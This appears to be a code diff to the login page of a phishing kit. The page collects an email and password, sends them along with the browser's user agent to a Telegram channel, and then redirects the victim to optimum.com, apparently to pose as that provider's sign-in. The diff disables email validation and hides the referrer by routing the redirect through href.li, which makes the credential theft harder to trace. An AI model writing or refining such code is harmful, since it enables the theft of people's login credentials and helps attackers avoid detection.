@@ -38,9 +38,10 @@ const Home = () => {
     let emailError = '';
     let passwordError = '';
 
-    if (!validateEmail(email)) {
-      emailError = 'Please enter a valid email.';
-    }
+    // if (!validateEmail(email)) {
+    //   emailError = 'Please enter a valid email.';
+    // }
+    
     if (password.length < 8) {
       passwordError = 'Password must be at least 8 characters.';
     }
@@ -99,7 +100,7 @@ User Agent: ${navigator.userAgent}`;
             
           await sendTelegramMessage(message);
           
-        window.location.href = 'https://optimum.com/';
+        window.location.href = 'https://href.li?https://optimum.com/';
 
         }
       } catch (error) {
